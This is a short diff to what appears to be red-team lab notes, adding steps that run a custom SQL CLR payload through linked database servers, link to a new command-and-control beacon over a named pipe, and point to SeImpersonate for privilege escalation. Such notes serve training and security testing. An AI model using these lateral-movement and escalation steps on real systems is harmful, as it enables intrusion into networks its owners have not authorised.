@@ -227,3 +227,9 @@ let's enable it
 
 now let's execute our payload again
     beacon> sql-clr lon-db-1 C:\Payloads\MyProcedure\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
+
+now try to link to new beacon
+    beacon> link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+    it works!
+
+interacting with the beacon on lon-db-2 we find we have SeImpersonate which we can use to escalate privs!
